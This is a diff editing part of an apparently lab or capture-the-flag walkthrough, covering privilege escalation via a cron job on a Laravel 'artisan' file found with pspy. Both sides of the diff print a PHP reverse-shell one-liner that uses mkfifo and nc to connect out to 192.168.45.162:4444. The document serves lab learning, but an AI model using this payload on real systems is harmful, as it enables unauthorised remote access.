@@ -44,20 +44,20 @@ Success! We have received a connection as the user, "www-data." The local flag c
 
 Now that we have a foothold on the machine we can attempt to find an escalation point for root access. 
 
-There is a folder in the home directory named, "skunk" which holds that local flag, we can check */etc/passwd* to see if there is a user names "skunk" as well. Surprisingly there is! On top of this, the "skunk" user appears to be in the (sudo) group.
+There is a folder in the home directory named, "skunk" which holds the local flag, we can check */etc/passwd* to see if any user shares this name. Surprisingly there is! On top of this, the "skunk" user appears to be in the (sudo) group.
 
-After some light directory transversal we did not find any potential vulnerable openings on the target machine. However, we would like to check and see if there are any running processes on the "skunk" user.
+After some light directory transversal we did not find any potential vulnerable openings on the target machine. However, we should check the "skunk" user to see if there are openings on this accounts.
 
-Since we don't have direct access to this user account, we can use the *pspy* open source library to check these processes -> https://github.com/DominicBreuker/pspy?source=post_page-----12bfd272e9cf-----------------------------------------
+Since we don't have direct access to this user account, we can use the *pspy* open source library to check processes running on the account -> https://github.com/DominicBreuker/pspy?source=post_page-----12bfd272e9cf-----------------------------------------
 
-After installation of the library and running the snooping process, we learn that there is a cron job running on the "artisan" file in the */var/www/html/lavita* directory.
+After installation of the library and running the snooping process, we learn that there is a cron-job running on the "artisan" file in the */var/www/html/lavita* directory.
 
 We can manipulate this file into give us a "skunk" user shell by replacing the current artisan file with our own version.
 
-To perform this:
+To perform this, we set up a listener and run the below commands:
 
 	rm artisan
-	echo 'echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.162 4444 >/tmp/f"); ?>' > artisan
+	echo '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.162 4444 >/tmp/f"); ?>' > artisan
 
 With a listener set up on our local machine, we get a reverse shell as the "skunk user"
 
@@ -84,9 +84,6 @@ Let's create move the current version of console.json:
 	touch console.json
 
 As the "skunk" user we are blocked from performing the first command. However, we can use our original shell as the "www-data" user to move this file with no denied permissions.
-
-
-
 
 Moving back to the "skunk" user,  we perform the escalation commands:
 
